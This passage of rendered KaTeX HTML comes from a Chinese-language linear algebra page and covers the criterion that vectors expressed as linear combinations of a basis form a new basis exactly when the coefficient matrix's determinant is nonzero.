style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">把</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">成</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">形</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">：</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>w</mi><mn>1</mn></msub><mo>=</mo><msub><mi>a</mi><mn>11</mn></msub><msub><mi>v</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>12</mn></msub><msub><mi>v</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mrow><mn>1</mn><mi>n</mi></mrow></msub><msub><mi>v</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">w_1=a_{11}v_1+a_{12}v_2+...+a_{1n}v_n
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>w</mi><mn>2</mn></msub><mo>=</mo><msub><mi>a</mi><mn>21</mn></msub><msub><mi>v</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>22</mn></msub><msub><mi>v</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mrow><mn>2</mn><mi>n</mi></mrow></msub><msub><mi>v</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">w_2=a_{21}v_1+a_{22}v_2+...+a_{2n}v_n
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
</li>
</ol>
<hr />
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>w</mi><mi>n</mi></msub><mo>=</mo><msub><mi>a</mi><mrow><mi>n</mi><mn>1</mn></mrow></msub><msub><mi>v</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mn>2</mn></mrow></msub><msub><mi>v</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mi>n</mi></mrow></msub><msub><mi>v</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">w_n=a_{n1}v_1+a_{n2}v_2+...+a_{nn}v_n
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>则</mtext><msub><mi>w</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>w</mi><mi>n</mi></msub><mtext>也是</mtext><mi>V</mi><mtext>的一个基，当且仅当下列矩阵的行列式不为零</mtext></mrow><annotation encoding="application/x-tex">则w_1,...w_n也是V的一个基，当且仅当下列矩阵的行列式不为零
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">则</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">基</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">当</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">仅</span><span class="mord cjk_fallback">当</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">矩</span><span class="mord cjk_fallback">阵</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">零</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mn>1</mn><mi>n</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mn>2</mn><mi>n</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mi>n</mi><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mi>n</mi><mn>2</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mrow><mi>n</mi><mi>n</mi></mrow></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix}
     a_{11 }&amp; a_{12} &amp; \cdots &amp; a_{1n} \\
    a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2n} \\
    \vdots &amp; \vdots  &amp; \ddots &amp; \vdots \\
   a_{n1} &amp; a_{n2} &amp; \cdots &amp; a_{nn} \\
\end{pmatrix}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.459999999999999em;vertical-align:-2.4799999999999995em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.950035em;"><span style="top:-1.3499850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-2.4999950000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.0950050000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.6900150000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-3.7100150000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎜</span></span></span><span style="top:-4.950035000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4500349999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9799999999999995em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.7674999999999996em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.5675000000000006em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9799999999999995em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.7674999999999996em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.5675000000000006em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t 